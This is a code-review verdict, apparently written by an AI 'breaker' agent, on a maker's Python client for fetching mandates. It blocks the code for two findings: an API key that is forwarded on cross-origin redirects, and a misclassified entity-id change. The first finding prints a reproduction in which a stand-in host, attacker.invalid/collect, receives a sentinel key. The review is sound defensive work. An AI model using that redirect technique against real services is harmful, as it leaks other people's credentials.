# Mandate Cell 7 Code Candidate v1 — Independent Breaker Verdict (Ka'el)

**Date:** 2026-08-04 EDT  
**Maker:** Kairos  
**Breaker:** Ka'el  
**Pre-frozen breaker matrix:** `12463a6cc45bae8049999a4091d2ed513eded758e6e8b596202b0ce890cf1b52`  
**Candidate manifest:** `ef5cdb1e89ddbf0e2ea8877683189af071b75dc557bb2839c432dbaaafa15440`

## Exact candidate attacked

```text
mandate_cell7.py       f9151500f72c9c8ba72f8ed202947291f29189bff60ed0ba9dfb6e91e75c2330
run_mandate_cell7.py   05c49a2d33b0024643d8ca2d132eaf9fb250952c1ae2a7a9caf40e81f7728987
test_mandate_cell7.py  334b6106c4dcae68f327118df5c95d356ec6034a829c1498d16760321d1757f9
```

The candidate was not edited by the breaker. Pre- and post-attack hashes matched in
the independent run. No live network call or real credential was used. The maker
subsequently superseded these working-tree bytes with candidate v2 after receiving
the breaker findings; that does not change this verdict on the sealed v1 hashes.

## Verdict: **BLOCK**

Maker tests passed 20/20. The independent harness returned seven PASS and two
reproducible BLOCK cases.

### K-CODE-1 — project key crosses the frozen origin on HTTP redirect

The production path constructed a `urllib.request.Request` carrying `X-API-Key` and
sent it through the default `urllib.request.urlopen` opener. Python's default
`HTTPRedirectHandler.redirect_request` copies all request headers except content
length/type to the redirected request, including `X-API-Key`.

Offline reproduction:

```text
initial URL       https://api.fipsign.dev/mandate/mdt_...
Location          https://attacker.invalid/collect
redirect method   GET
redirect headers  X-api-key: KAEL_SENTINEL_PROJECT_KEY_DO_NOT_PERSIST
```

The initial URL was pinned, but the credential was not pinned after a 30x response.
That violates the direct fixed-origin GET and key-containment boundary. Repair must
refuse redirects before constructing or sending a second request carrying the key;
the regression test must cover cross-origin 301/302/303/307/308 without network.

### K-CODE-2 — the entity-id half of M4 is flattened into unreachable

Frozen M4 covers an id **or** subject move:

```text
expected: REFUSED_STALE / INVALID_FOR_CELL_7 / changed_keys=[entity_id]
observed: REFUSED_UNREACHABLE / SOURCE_UNREACHABLE / changed_keys=[]
counts:   GET=1, key_load=1
```

`MandateSourceAdapter.read()` rejected a returned id different from the bound id as
`INVALID_SOURCE_RESPONSE`; `fetch()` flattened it to `None` before the unchanged gate
could record the moved normalized field. This is fail-closed, but it does not execute
the frozen M4 control and erases the diagnostic delta. Subject movement did pass.

Repair must let a well-formed changed returned id reach the unchanged gate, which
then returns stale; the evidence classifier must keep it `INVALID_FOR_CELL_7`.
Request-path binding remains against the original bound id.

## Independent green cases retained

- exact raw/canonical private CAPTURE artifacts at `0600`, one GET, no key persisted;
- recursive case-insensitive forbidden-key scan through nested arrays, zero raw write;
- tampered carry returns `INVALID_BASELINE_CARRY` with key=0 and HTTP=0;
- expired window returns `EXPIRED_WINDOW` with key=0 and HTTP=0; exact boundary runs;
- scope-only and empty-scope narrowing classify Cell 7;
- status, subject, original-scope, and expansion controls classify separately;
- exact candidate hashes matched after the attack.

## Reproduction artifact

`agent_outputs/MANDATE_CELL7_CODE_BREAKER_HARNESS_KAEL_2026-08-04.py`  
Original harness SHA-256: `34dd7ad5a2220469c12944979e61f0b2149a004e8fe6e86d242872ddaeba0214`

The harness made zero network calls and used zero real credentials. Because its hash
expectations intentionally pin candidate v1, rerunning it after candidate v2 replaces
the working-tree files correctly reports candidate drift.

## Next

Candidate v1 is not authorized for a live fixture. Maker must freeze new hashes and
the breaker must run a bounded offline regression on the redirect, M4, and retained
green custody/count cases.

